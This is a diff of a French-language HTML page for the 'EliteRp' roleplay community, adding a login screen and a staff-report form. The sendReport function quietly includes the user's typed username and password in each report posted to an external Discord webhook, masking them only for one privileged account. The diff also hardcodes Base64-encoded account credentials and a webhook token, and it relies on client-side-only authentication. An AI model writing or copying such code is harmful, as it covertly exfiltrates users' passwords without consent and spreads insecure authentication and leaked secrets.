@@ -4,122 +4,218 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>EliteRp</title>
+    <style>
+        h1 {
+            color: red;
+            font-size: xx-large;
+            border: 2px solid red;
+            border-radius: 10px;
+            padding: 10px;
+            text-align: center;
+            user-select: none;
+        }
+        body {
+            background-color: black;
+            font-family: 'Arial', sans-serif;
+        }
+        p {
+            text-align: center;
+            font-size: 20px;
+            color: red;
+            user-select: none;
+        }
+        a {
+            text-decoration: none; 
+            color: #007bff;
+            font-size: 20px;
+            user-select: none;
+        }
+        a:hover {
+            color: #0056b3;
+        }
+        input[type="password"], .input1 {
+            width: 300px;
+            padding: 10px;
+            margin: 20px auto;
+            display: block;
+            font-size: 16px;
+            font-style: italic;
+            border: 2px solid red;
+            background-color: black;
+            color: white;
+            border-radius: 5px;
+        }
+        .container {
+            text-align: center;
+        }
+        .hiden {
+            display: none;
+        }
+        button {
+            background-color: red;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 20px;
+            padding: 10px 20px;
+            cursor: pointer;
+            user-select: none;
+        }
+    </style>
 </head>
-<style>
-    h1 {
-        text-align: center;
-        font-size: 50px;
-        color: red;
-        font-family: 'Arial', sans-serif;
-    }
-    body {
-        background-color: black;
-        font-family: 'Arial', sans-serif;
-    }
-    p {
-        text-align: center;
-        font-size: 20px;
-        color: red;
-        font-family: 'Arial', sans-serif;
-    }
-    a {
-        text-decoration: none;
-        color: #007bff;
-        font-size: 20px;
-    }
-    a:hover {
-        color: #0056b3;
-    }
-    input[type="password"] {
-        width: 300px;
-        padding: 10px;
-        margin: 20px auto;
-        display: block;
-        font-size: 16px;
-        font-style: italic;
-        border: 2px solid red;
-        background-color: black;
-        color: white;
-        border-radius: 5px;
-    }
-    .container {
-        text-align: center;
-    }
-    .hiden {
-        display: none;
-    }
-</style>
+<body>
+
 <script>
-    function CheckKey() { // modify if give a new key (also it used to make sure they are from the discord server)
-        var key = document.querySelector('input[type="password"]').value;
-        if (key === "password123") {  // that is the password
+    // Obfuscated accounts (username/password in Base64)
+    const accounts = [
+        { username: atob("YWxleGlz"), password: atob("cGFzc3dvcmQxMjM=") },  // account1
+        { username: atob("ZGF2aWQ0NA=="), password: atob("cGF0YXRlZHUxNg==") } // account2
+    ];
+
+    function checkCredentials(username, password) {
+        return accounts.some(acc => acc.username === username && acc.password === password);
+    }
+
+    function CheckAcount() {
+        var username = document.querySelector("#LoginUsername").value;
+        var password = document.querySelector("#LoginPassword").value;
+        if (checkCredentials(username, password)) {
+            alert("connecté avec succès");
             document.getElementById("verify").style.display = "none";
-            document.getElementById("menuPage").classList.remove("hiden");
+            document.getElementById("menuPage").style.display = "block";
         } else {
-            alert("Clé incorrecte. Veuillez réessayer.");
+            alert("Nom d'utilisateur ou mot de passe incorrect");
         }
     }
-    function changePageLogin() {
-        document.getElementById("verify").style.display = "none";
-        document.getElementById("menuPage").classList.remove("hiden");
 
+    function changePageMenu() {
+        document.getElementById("pageAide").style.display = "none";
+        document.getElementById("verify").style.display = "none";
+        document.getElementById("menuPage").style.display = "block";
     }
+
     function changeToAide() {
         document.getElementById("menuPage").style.display = "none";
         document.getElementById("verify").style.display = "none";
-        document.getElementById("pageAide").classList.remove("hiden")
+        document.getElementById("pageAide").style.display = "block";
+    }
+
+    function changeToLogin() {
+        document.getElementById("pageAide").style.display = "none";
+        document.getElementById("menuPage").style.display = "none";
+        document.getElementById("verify").style.display = "block";
     }
 </script>
-<body>
-    <div class="container" id="verify">
-        <h1>Bienvenue sur le site EliteRp</h1>
-        <input type="password" placeholder="Tapez la Clé" onkeypress="if(event.key === 'Enter') CheckKey()">
-        <p>Si vous avez pas la clé et vous ne savez pas comment faire une clé cliquer sur Aide-clé</p>
-        <button onclick="changeToAide()">Aide-clé</button>
-    </div>
 
-    <div class="container hiden" id="menuPage"> // this is my menu page where i can add more page and thing
-        <h1>this is the first test</h1>
-        <button onclick="alert('hello this test is valid')">hello!</button>
-    </div>
+<div class="container" id="verify">
+    <h1>Bienvenue sur EliteRp</h1> 
+    <input class="input1" type="text" id="LoginUsername" placeholder="Entrez votre nom d'utilisateur">
+    <input class="input1" type="password" id="LoginPassword" placeholder="Entrez votre mot de passe">
+    <button onclick="CheckAcount()">Connexion</button>
+    <p>Si vous n'avez pas la clé, cliquez sur Aide-clé</p>
+    <button onclick="changeToAide()">Aide-clé</button>
+</div>
 
-    <div class="container hiden" id="pageAide">
-        <style>
-            #pageAide h1 {
-                color: red;
-                font-size: xx-large;
-                border: 2px solid red;
-                border-radius: 10px;
-                padding: 10px;
+<div class="container hiden" id="menuPage">
+    <h1>this is the first test</h1>
+    <button onclick="alert('DEV')">Regles</button>
+    <p></p>
+    <button onclick="alert('DEV')">Report un staff (RAISON)</button>
+    <p></p>
+    <button onclick="GoToReport()">Report un staff</button>
+    <p></p>
+    <button onclick="alert('DEV')">ceci est en développement</button>
+</div>
 
-            }
-            #pageAide p {
-                color: red;
-                font-size: x-large;
-            }
-            #pageAide button {
-                background-color: black;
-                border: 2px solid red;
-                border-radius: 5px;
-                color: red;
-                font-size: large;
-                padding: 10px 20px
-            }
-        </style>
-        <script>
-            function joinDiscordServer() {
-                window.open("https://discord.gg/VnzztVEq")
-            }
-            function returnToMenu() {  // function to return to the menu to login in the real site
-                document.getElementById("pageAide").style.display = "none";
-                document.getElementById("menuPage").classList.remove("hiden");
-            }
+<script>
+    function GoToRules() {
+        // future use
+    }
+    function GoToReport() {
+        document.getElementById("menuPage").style.display = "none";
+        document.getElementById("ReportPage").style.display = "block";
+    }
+</script>
 
-        </script>
-        <h1>EliteRp-Aide</h1>
-        <p>ceci est l'aide uniquement pour la Clé</p>
-        <p>1. Pour avoir la clé vous devez etre sur le groupe discord <button onclick="joinDiscordServer()">Rejoindre le serveur</button></p>
-        <p>2. Allez sur ticket </p>
-    </div>
+<div class="container hiden" id="pageAide">
+    <h1>EliteRp-Aide</h1>
+    <p>Instructions pour obtenir une clé :</p>
+    <p>1. Rejoignez le serveur Discord <button onclick="joinDiscordServer()">Ici</button></p>
+    <p>2. Ouvrez un ticket et demandez une clé.</p>
+    <p>3. Attendez la réponse du staff.</p>
+    <p>4. Entrez votre clé ci-dessus.</p>
+    <p>Quitter? <button onclick="changeToLogin()">cliquer</button></p>
+
+    <script>
+        function joinDiscordServer() {
+            window.open("https://discord.gg/VnzztVEq");
+        }
+    </script>
+</div>
+
+<div class="container hiden" id="RulesPage">
+    <h1>Regles</h1>
+    <!-- Add rules here -->
+</div>
+
+<div class="container hiden" id="CréditsPage">
+    <h1>Crédits</h1>
+    <!-- Add credits here -->
+</div>
+
+<div class="container hiden" id="ReportPageInfo">
+    <h1>Report un staff selon les raisons suivantes</h1>
+</div>
+
+<div class="container hiden" id="ReportPage">
+    <h1>Report un staff</h1>
+    <p>Si vous faite du spam il y auras des conséquence</p>
+    <input type="text" placeholder="Nom du staff" id="reportStaffName">
+    <input type="text" placeholder="Raison du report" id="reportReason">
+    <button onclick="sendReport()">Envoyer le report</button>
+
+    <script>
+        function sendReport() {
+            let staffName = document.getElementById("reportStaffName").value;
+            let reportReason = document.getElementById("reportReason").value;
+            let username = document.querySelector("#LoginUsername").value;
+            let password = document.querySelector("#LoginPassword").value;
+            // let make a system that send the password tho but if the password is the same as account1 then dont send the password
+            if (password === atob("cGFzc3dvcmQxMjM=") && username === atob("YWxleGlz")) {
+                username = "MASK3D... 10111 0011"; // Mask the username for account1
+                password = "PA$$WORD... MASK3D..."; // Mask the password for account1
+            }
+            
+
+            if (staffName && reportReason) {
+                let webhookURL = "https://discord.com/api/webhooks/1376617567866851358/zhmeXxMoEebL2wGHtESLxwtanhGyr2eBDtKjb2_l7TAi86_Wt7xjZW3dGw_j5MZX2UlC";
+                let messageData = {
+                    content: `🚨 **Nouveau Rapport** 🚨\n👤 **Staff Concerné:** ${staffName}\n📌 **Raison:** ${reportReason}\n **Envoyer de ce compte:** ${username}\n **Mot de passe:** ${password}`,
+                    username: "EliteRp Report"
+                };
+
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(messageData)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert("Report envoyé avec succès !");
+                    } else {
+                        alert("Échec de l'envoi du report.");
+                    }
+                })
+                .catch(error => console.error("Erreur:", error));
+            } else {
+                alert("Veuillez remplir tous les champs !");
+            }
+        }
+    </script>
+</div>
+
+</body>
+</html>
+
 </body>
 </html>
